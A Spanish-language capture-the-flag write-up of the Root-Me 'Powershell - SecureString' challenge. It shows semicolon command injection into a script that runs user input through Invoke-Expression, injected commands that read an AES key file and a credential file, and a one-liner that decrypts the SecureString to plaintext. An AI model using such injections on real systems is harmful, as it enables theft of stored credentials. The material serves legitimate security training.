Writeup: "Powershell - SecureString" - Root-Me Challenge

📋 Información del Reto
Campo	Valor
Nombre	Asegurar mi cadena
Plataforma	Root-Me
Puntos	15
Dificultad	2% de éxito (4255 intentos)
Categoría	PowerShell - SecureString
Autor	hat.time
Fecha	19 junio 2020

📖 Enunciado

    "Recuperar la contraseña de la base de datos, ¡con un giro!"

🎯 Objetivo

Recuperar la contraseña almacenada en un sistema que utiliza SecureString de PowerShell con encriptación AES personalizada y comprender el "giro" del reto.
🔍 Análisis Inicial
Acceso al Sistema

Al conectarnos vía SSH, nos encontramos con el siguiente prompt interactivo:
text

Table to dump:
> 

Identificación del Entorno

El prompt proviene de un script de PowerShell que se ejecuta automáticamente al iniciar sesión. El script está en un entorno Cygwin (Windows con emulación Unix).
🛠️ Descubrimiento de la Vulnerabilidad
Paso 1: Comportamiento Básico del Script

Primera prueba: Introducimos ls
text

> ls
Connect to the database With the secure Password: System.Security.SecureString. Backup the table ls

Observación clave: El script refleja nuestro input (ls) al final del mensaje. Esto indica que nuestro input se está concatenando en alguna parte del código.
Paso 2: Prueba de Inyección

Para determinar si el script es vulnerable a inyección de comandos, introducimos un comando precedido de punto y coma (;), que en PowerShell separa comandos independientes.
text

> ; Get-ChildItem
Connect to the database With the secure Password: System.Security.SecureString. Backup the table
[lista de archivos del directorio]

Resultado: El script ejecutó Get-ChildItem además del mensaje original. Esto confirma que el input del usuario se está ejecutando como código.

Deducción: El script utiliza Invoke-Expression (iex) para ejecutar dinámicamente el input del usuario.
Paso 3: ¿Por Qué el Punto y Coma (;) es el Método Efectivo?

El punto y coma ; es el separador de comandos en PowerShell. Cuando se usa dentro de una cadena que se pasa a iex, el ; sale de la cadena y se convierte en un separador de comandos.

Comparación de métodos de inyección:
Método	Ejemplo	¿Funciona?	Explicación
;	; Get-Content	✅	Separa comandos. El iex ejecuta ambos.
& {}	& { Get-Content }	❌	El bloque se evalúa dentro de la cadena, su resultado se muestra como texto.
$()	$(Get-Content)	❌	La subexpresión se evalúa dentro de la cadena, su resultado se muestra como texto.
| iex	"Get-Content" | iex	❌	El pipe se interpreta dentro de la cadena, no como operador.
`n | `nGet-Content	❌	El salto de línea no separa comandos dentro de una cadena.	
📂 Exploración del Directorio
Comando 1: Listar archivos
powershell

> ; Get-ChildItem

Captura:
text

Connect to the database With the secure Password: System.Security.SecureString. Backup the table


    Directory: C:\cygwin64\challenge\app-script\ch19


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/12/2021   9:25 AM             43 .git
-a----       10/29/2020   9:27 AM            361 .passwd.crypt
------       12/12/2021   9:50 AM            748 ._perms
-a----       10/29/2020   9:23 AM            176 AES.key
-a----       10/29/2020   9:30 AM            331 ch19.ps1

Análisis:

    Get-ChildItem es el equivalente a ls en PowerShell

    Lista todos los archivos del directorio actual

    Archivos clave identificados:

        AES.key - Clave de encriptación (176 bytes)

        .passwd.crypt - Contraseña encriptada (361 bytes)

        ch19.ps1 - Script principal (331 bytes)

        ._perms - Archivo de permisos (748 bytes)

        .git - Archivo de Git (43 bytes)

📜 Análisis del Script
Comando 2: Leer el script
powershell

> ; Get-Content ch19.ps1

Captura:
text

$KeyFile = "AES.key"
$key = Get-Content $KeyFile
$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key

while($true){
        Write-Host "Table to dump:"
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table"
}

Análisis Línea por Línea
Línea	Código	Explicación
1	$KeyFile = "AES.key"	Define la ruta del archivo de clave
2	$key = Get-Content $KeyFile	Lee el contenido del archivo AES.key
3	$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key	Lee el archivo encriptado y lo convierte a SecureString usando la clave AES
5	while($true){	Bucle infinito
6	Write-Host "Table to dump:"	Muestra el texto "Table to dump:"
7	Write-Host -NoNewLine "> "	Muestra el prompt "> " sin salto de línea
8	$table=Read-Host	Lee la entrada del usuario
10	iex "Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table"	Ejecuta el comando con el input del usuario
🔍 Explicación Detallada de la Línea iex
La Línea Clave del Script
powershell

iex "Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table"

Desglose de la Línea
Elemento	Qué hace	Explicación
iex	Invoke-Expression	Ejecuta la cadena como código PowerShell
"..."	Cadena de texto	El comando a ejecutar
Write-Host	Cmdlet de PowerShell	Muestra texto en la consola
$SecurePassword	Variable del script	Contiene el SecureString encriptado
$table	Variable del script	Contiene nuestro input
¿Cómo Funciona la Inyección?

Cuando escribimos: ; Get-ChildItem

La variable $table contiene: ; Get-ChildItem

El comando se convierte en:
powershell

iex "Write-Host Connect to the database With the secure Password: System.Security.SecureString. Backup the table ; Get-ChildItem"

PowerShell interpreta esto como DOS comandos:

    Write-Host Connect to the database With the secure Password: System.Security.SecureString. Backup the table

    Get-ChildItem

¿Por Qué el Script no se Conecta a una Base de Datos Real?

Punto Crítico: El script NO se conecta a ninguna base de datos real. La línea iex "Write-Host ..." solo muestra un mensaje en pantalla. No hay:

    Conexiones a bases de datos

    Comandos SQL

    Backups reales

    Tablas reales

Es una simulación completa.
Demostración del Comportamiento

Ejemplo 1: El Script Original
powershell

$table = "ls"
iex "Write-Host Backup table $table"

Salida:
text

Backup table ls

Ejemplo 2: Inyección con ;
powershell

$table = "; Get-ChildItem"
iex "Write-Host Backup table $table"

Salida:
text

Backup table
Get-ChildItem: muestra lista de archivos

Ejemplo 3: Inyección con ; y Múltiples Comandos
powershell

$table = "; Get-Content AES.key; Get-ChildItem"
iex "Write-Host Backup table $table"

Salida:
text

Backup table
3 4 2 3 56 34 ... (contenido de AES.key)
[lista de archivos]

🔐 Proceso de Desencriptación
Comando 3: Leer la clave AES
powershell

> ; Get-Content AES.key

Captura:
text

3
4
2
3
56
34
254
222
1
1
2
23
42
54
33
233
1
34
2
7
6
5
35
43

Análisis:

    Get-Content lee el archivo línea por línea

    La clave es un arreglo de bytes (valores numéricos del 1 al 254)

    PowerShell usa este arreglo como clave para AES

    El arreglo tiene 24 bytes (clave AES-192) o 32 bytes (AES-256)

    En este caso, la clave se usa con ConvertTo-SecureString -Key $key

Comando 4: Leer la contraseña encriptada
powershell

> ; Get-Content .passwd.crypt

Captura:
text

76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQARQBqAEEARQBPAEEAPQA9AHwAMgAyAGMANQA1
ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAANwA3ADIAYgBkADYANgAyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIA
MgA1AGYANgBkAGYAYgAxAGMAMgAwADUANQBkADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYAMAAyADgAZAAwADEAMgBmAGEAZQBm
ADgANAAyADkA

Análisis:

    Es un SecureString encriptado en formato Base64

    El prefijo 76492d1116743f0423413b16050a5345 es característico de ConvertFrom-SecureString

    Requiere la clave AES para ser desencriptado

    No es legible directamente

Comando 5: Desencriptar la contraseña
powershell

> ; $key = Get-Content AES.key; $SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -Key $key; $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword); $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR); [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR); Write-Host "Password: $plain"

Captura:
text

Connect to the database With the secure Password: System.Security.SecureString. Backup the table
Password: ********************

Análisis del Comando de Desencriptación
Parte del Comando	Explicación
$key = Get-Content AES.key	Lee la clave AES del archivo
$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -Key $key	Lee el archivo encriptado y lo convierte a SecureString usando la clave AES
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)	Convierte el SecureString a un BSTR (Binary String) en memoria
$plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)	Convierte el BSTR a texto plano
[System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)	Libera la memoria del BSTR (seguridad)
Write-Host "Password: $plain"	Muestra la contraseña en texto plano
¿Por qué no usar ConvertTo-SecureString directamente?

ConvertTo-SecureString con -Key crea un SecureString, pero no se puede convertir directamente a texto plano por diseño de seguridad. La única forma de obtener el texto plano es usando las APIs de .NET (Marshal).
🔍 Exploración Adicional (Comandos de Depuración)

Durante la resolución, también ejecutamos estos comandos para entender el entorno:
Comando 6: Ver puertos abiertos
powershell

> ; netstat -an | Select-String "LISTEN"

Captura Parcial:
text

TCP    0.0.0.0:22             0.0.0.0:0              LISTENING
TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
TCP    127.0.0.1:49670        0.0.0.0:0              LISTENING
TCP    [::]:22                [::]:0                 LISTENING

Análisis:

    Puerto 22 → SSH (nuestra conexión actual)

    Puertos 135, 443, 47001 → Servicios de Windows

    Puertos 49664-49674 → Puertos dinámicos de Windows

    NO hay puertos de bases de datos (3306 MySQL, 5432 PostgreSQL, 1433 SQL Server)

    Esto confirma que no hay base de datos en el sistema

Comando 7: Ver servicios en ejecución
powershell

> ; Get-Service | Where-Object { $_.Status -eq "Running" }

Captura Parcial:
text

Status      : Running
Name        : sshd
DisplayName : CYGWIN sshd

Status      : Running
Name        : syslog-ng
DisplayName : CYGWIN syslog-ng

Status      : Running
Name        : xinetd
DisplayName : CYGWIN xinetd

Status      : Running
Name        : nxlog
DisplayName : nxlog

Análisis:

    sshd → Servidor SSH (nuestra conexión)

    syslog-ng → Servicio de logs

    xinetd → Super servidor (servicios bajo demanda)

    nxlog → Servicio de logs

    NO hay servicios de bases de datos

    Esto confirma que no hay base de datos en el sistema

Comando 8: Verificar archivos de base de datos
powershell

> ; Get-ChildItem -Recurse -Filter *.db -ErrorAction SilentlyContinue
> ; Get-ChildItem -Recurse -Filter *.sqlite -ErrorAction SilentlyContinue
> ; Get-ChildItem -Recurse -Filter *.db3 -ErrorAction SilentlyContinue

Captura:
text

Table to dump:
>

Análisis:

    No se encontraron archivos de base de datos

    -Recurse busca en subdirectorios

    -Filter filtra por extensión

    -ErrorAction SilentlyContinue suprime errores de permisos

    Confirma que no hay base de datos en el sistema

🧩 El "Giro" del Reto
Lo que la mayoría de los participantes espera:

    ✅ Encontrar la contraseña → ********************

    🔍 Conectarse a una base de datos → (No existe)

    💾 Hacer un backup de la tabla "ls" → (No existe)

    🏆 Encontrar la flag en la base de datos → (No existe)

La realidad:

    ✅ Encontrar la contraseña → ********************

    ❌ No hay base de datos → Es una simulación completa

    ❌ No hay tabla "ls" → Es un nombre de tabla simulado

    ✅ La contraseña ES la flag → No hay más pasos

¿Por qué es un "giro"?

El "giro" es psicológico y técnico:

    El script crea la ilusión de una base de datos:

        Prompt "Table to dump:"

        Mensaje "Connect to the database"

        Mención de "Backup the table"

    El script usa técnicas de seguridad reales:

        SecureString

        Encriptación AES

        Clave externa (AES.key)

    Pero todo es una simulación:

        iex "Write-Host ..." solo muestra mensajes

        No hay conexiones a bases de datos

        No hay comandos SQL

        No hay archivos de base de datos

    El "giro" final:

        La contraseña descifrada ES la respuesta

        No hay que buscar más allá

        La simulación es el "giro"

Estadística de Éxito

2% de éxito (4255 intentos)

¿Por qué tan bajo?

    La mayoría descifra la contraseña

    Luego busca una base de datos que no existe

    Se quedan atascados en el bucle infinito

    No reconocen que la contraseña es la flag

📊 Resumen de Comandos Utilizados
Comando	Propósito	Explicación
; Get-ChildItem	Listar archivos	Inspeccionar el directorio actual
; Get-Content ch19.ps1	Leer el script	Analizar el código fuente
; Get-Content AES.key	Leer la clave	Obtener la clave de encriptación
; Get-Content .passwd.crypt	Leer contraseña encriptada	Obtener el SecureString encriptado
; $key = Get-Content AES.key; ...	Desencriptar	Obtener la contraseña en texto plano
; netstat -an | Select-String "LISTEN"	Ver puertos	Buscar servicios de base de datos
; Get-Service	Ver servicios	Buscar servicios de base de datos
; Get-ChildItem -Recurse -Filter *.db	Buscar base de datos	Buscar archivos de base de datos
